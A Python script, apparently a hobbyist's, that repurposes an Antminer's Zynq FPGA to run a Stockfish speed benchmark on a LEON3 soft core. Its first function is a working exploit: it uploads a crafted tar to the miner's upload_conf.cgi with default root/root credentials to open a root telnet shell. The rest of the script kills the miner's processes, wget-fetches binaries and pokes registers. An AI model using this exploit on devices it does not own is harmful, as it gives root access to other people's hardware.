import socket
import time
import sys
import os
import urllib.request

IP = '192.168.2.100'
HTTP_HOST = '192.168.2.1:8000'

def ensure_telnet():
    s = socket.socket()
    s.settimeout(1.0)
    try:
        s.connect((IP, 23))
        s.close()
        print("[+] Telnet port 23 is open and ready!", flush=True)
        return True
    except:
        pass

    print("[*] Opening root telnet via upload_conf.cgi exploit...", flush=True)
    with open(r'C:\Users\Kolby\.gemini\antigravity\scratch\sparc_zynq\exploit_backup.tar', 'rb') as f:
        tar_bytes = f.read()

    boundary = '---------------------------30971039824056275816281729007'
    body = bytearray()
    body += f'--{boundary}\r\n'.encode()
    body += b'Content-Disposition: form-data; name="ant_conf_file"; filename="exploit_backup.tar"\r\n'
    body += b'Content-Type: application/x-tar\r\n\r\n'
    body += tar_bytes
    body += f'\r\n--{boundary}--\r\n'.encode()

    mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
    mgr.add_password('antMiner Configuration', f'http://{IP}/', 'root', 'root')
    mgr.add_password(None, f'http://{IP}/', 'root', 'root')
    opener = urllib.request.build_opener(urllib.request.HTTPDigestAuthHandler(mgr))

    req = urllib.request.Request(f'http://{IP}/cgi-bin/upload_conf.cgi', data=body)
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

    for _try in range(3):
        try:
            opener.open(req, timeout=45)
            print("[+] Exploit uploaded successfully!", flush=True)
            break
        except Exception as e:
            print(f"[!] Exploit attempt {_try+1} response: {e}", flush=True)
            time.sleep(3)

    time.sleep(1.5)
    for attempt in range(15):
        try:
            s = socket.socket()
            s.settimeout(1.5)
            s.connect((IP, 23))
            s.close()
            print("[+] Telnet port 23 is now ACTIVE!", flush=True)
            return True
        except:
            time.sleep(1.0)
    print("[-] Failed to connect to telnet!", flush=True)
    return False

def run():
    print("=" * 68)
    print("  LAUNCHING STAGE 3 STOCKFISH SPEEDTEST ON PHYSICAL FPGA PL")
    print("  Arch: 32-Lane Hardware NNUE Compute Core | 32K I/D$ | 1MHz GPTIMER")
    print("=" * 68)

    if not ensure_telnet():
        print("[-] Cannot reach telnet, exiting!")
        return

    s = socket.socket()
    s.settimeout(15)
    s.connect((IP, 23))

    def cmd(c, sleep_sec=0.3, timeout=20):
        nonlocal s
        for retry in range(3):
            try:
                s.sendall((c + "\n").encode())
                time.sleep(sleep_sec)
                buf = ""
                start = time.time()
                while time.time() - start < timeout:
                    try:
                        chunk = s.recv(4096)
                        if not chunk: break
                        buf += chunk.decode('latin1', errors='ignore')
                        if buf.endswith("# ") or "(unknown) #" in buf:
                            break
                    except socket.timeout:
                        pass
                return buf
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
                time.sleep(1.0)
                try:
                    s.close()
                except:
                    pass
                s = socket.socket()
                s.settimeout(15)
                try:
                    s.connect((IP, 23))
                except:
                    pass

    print("\n1. Configuring kernel failsafes & stopping miner...", flush=True)
    cmd("echo 1 > /proc/sys/kernel/panic")
    cmd("echo 1 > /proc/sys/kernel/panic_on_oops")
    cmd("echo '#!/bin/sh' > /sbin/monitorcg")
    cmd("echo 'while true; do sleep 3600; done' >> /sbin/monitorcg")
    cmd("killall -9 monitorcg bmminer single-board-test 2>/dev/null")
    cmd("/etc/init.d/bmminer.sh stop 2>/dev/null")
    cmd("rmmod fpga_mem_driver bitmain_axi 2>/dev/null")

    print("\n2. Programming Stage 3 Bitstream (leon3mp_stage3.bit.bin)...", flush=True)
    cmd(f"wget http://{HTTP_HOST}/leon3mp_stage3.bit.bin -O /tmp/leon3mp_stage3.bit.bin", sleep_sec=1.5, timeout=20)
    prog_res = cmd("cat /tmp/leon3mp_stage3.bit.bin > /dev/xdevcfg", sleep_sec=3.0, timeout=20)
    print("  Bitstream programming output:", prog_res.strip().splitlines()[-1] if prog_res.strip() else "done", flush=True)
    prog_done_out = cmd("cat /sys/devices/amba.0/f8007000.ps7-dev-cfg/prog_done")
    prog_done = "0"
    for l in prog_done_out.splitlines():
        l = l.strip()
        if l in ["0", "1"]:
            prog_done = l
    print(f"  FPGA prog_done: {prog_done}", flush=True)
    if prog_done != "1":
        print("[-] ERROR: FPGA programming failed (prog_done != 1)!", flush=True)
        s.close()
        return

    print("\n3. Enabling PS-PL level shifters...", flush=True)
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d")
    cmd("/sbin/devmem 0xf8000900 32 0x0000000f")
    cmd("/sbin/devmem 0xf8000004 32 0x767b")

    print("\n4. Holding LEON3 SPARC CPU in reset...", flush=True)
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d")
    cmd("/sbin/devmem 0xf8000240 32 0x1")
    cmd("/sbin/devmem 0xf8000004 32 0x767b")

    print("\n5. Fetching fast DMA loader & Stage 3 Stockfish binary...", flush=True)
    cmd(f"wget http://{HTTP_HOST}/load_stockfish_fast.pl -O /tmp/load_stockfish_fast.pl", sleep_sec=0.5, timeout=10)
    cmd(f"wget http://{HTTP_HOST}/stockfish_speedtest_swapped.bin -O /tmp/stockfish_speedtest_swapped.bin", sleep_sec=2.0, timeout=30)
    ls_out = cmd("ls -lh /tmp/stockfish_speedtest_swapped.bin")
    print("  Binary on board:", ls_out.strip(), flush=True)

    print("\n6. Executing high-speed kernel DMA loader...", flush=True)
    dma_out = cmd("perl /tmp/load_stockfish_fast.pl", sleep_sec=1.0, timeout=20)
    print("  DMA output:", dma_out.strip(), flush=True)

    def get_devmem(addr):
        out = cmd(f"/sbin/devmem {addr:#x}")
        lines = [l.strip() for l in out.splitlines() if l.strip()]
        for l in lines:
            if l.startswith("0x") and l.lower() != f"{addr:#x}".lower():
                return l
        return "0x00000000"

    print("\n7. Verifying entry point and memory mapping:", flush=True)
    entry = [get_devmem(0x1f000000 + off) for off in [0, 4, 8, 12]]
    print(f"  Entry point [0x1F000000]: {entry}", flush=True)

    print("\n8. RELEASING RESET: Launching Stage 3 Stockfish on FPGA PL!", flush=True)
    cmd("/sbin/devmem 0xf8000008 32 0xdf0d")
    cmd("/sbin/devmem 0xf8000240 32 0x0")
    cmd("/sbin/devmem 0xf8000004 32 0x767b")

    print("\n9. Monitoring real-time speedtest execution via mailbox...", flush=True)
    magic_names = {
        0x494E4954: "INITIALIZING ENGINE",
        0x53504544: "SPEEDTEST SEARCHING POSITIONS",
        0x444F4E45: "BENCHMARK COMPLETED SUCCESSFULLY",
    }

    def read_mb():
        batch_cmd = "; ".join([f"/sbin/devmem {0x1ff00000 + i*4:#x}" for i in range(8)])
        out = cmd(batch_cmd, sleep_sec=0.2, timeout=5)
        hex_vals = []
        for l in out.splitlines():
            l = l.strip()
            if l.startswith("0x") and len(l) >= 8:
                try:
                    val = int(l, 16)
                    if val != 0x1ff00000 + len(hex_vals)*4:
                        hex_vals.append(val)
                except:
                    pass
        if len(hex_vals) >= 8:
            return hex_vals[:8]
        return None

    last_pos = -1
    bench_start_time = None
    first_seen = time.time()

    while True:
        vals = read_mb()
        now = time.time()
        if vals:
            magic, pos_idx, total_pos, nodes_lo, nodes_hi, time_lo, time_hi, flags = vals
            total_nodes = (nodes_hi << 32) | nodes_lo
            time_ms = (time_hi << 32) | time_lo
            status = magic_names.get(magic, f"MAGIC: {magic:#x}")

            if bench_start_time is None and magic == 0x53504544:
                bench_start_time = now
                print(f"\n>>> SPEEDTEST SEARCH COMMENCED! Evaluating 258 benchmark positions... <<<\n", flush=True)

            if pos_idx != last_pos and magic in [0x53504544, 0x444F4E45]:
                elapsed = now - (bench_start_time or first_seen)
                nps = (total_nodes / (time_ms / 1000.0)) if time_ms > 0 else (total_nodes / elapsed if elapsed > 0 else 0)
                pct = (pos_idx / 258.0) * 100.0 if total_pos == 258 else 0
                print(f"  [Pos {pos_idx:3d}/258 ({pct:5.1f}%)] Nodes: {total_nodes:8,d} | Time: {time_ms/1000.0:6.1f}s | Speed: {nps:7.1f} NPS | State: {status}", flush=True)
                last_pos = pos_idx

            if magic == 0x444F4E45:
                total_bench_time = now - bench_start_time if bench_start_time else (time_ms / 1000.0)
                print("\n" + "=" * 68)
                print("  STAGE 3 HARDWARE ACCELERATED SPEEDTEST COMPLETE!")
                print("=" * 68)
                print(f"  Total Benchmark Positions: {total_pos}")
                print(f"  Total Positions Evaluated: {pos_idx}")
                print(f"  Total Search Nodes:        {total_nodes:,} nodes")
                print(f"  Total Elapsed Time:        {total_bench_time:.2f} seconds")
                print(f"  Final True Hardware NPS:   {total_nodes / total_bench_time:.1f} NPS")
                print(f"  Reported Engine NPS:       {(total_nodes * 1000.0 / time_ms):.1f} NPS (from internal timer)")
                print("=" * 68)
                break
        else:
            print("  Waiting for mailbox response...", flush=True)
        time.sleep(0.5)

    s.close()

if __name__ == '__main__':
    run()
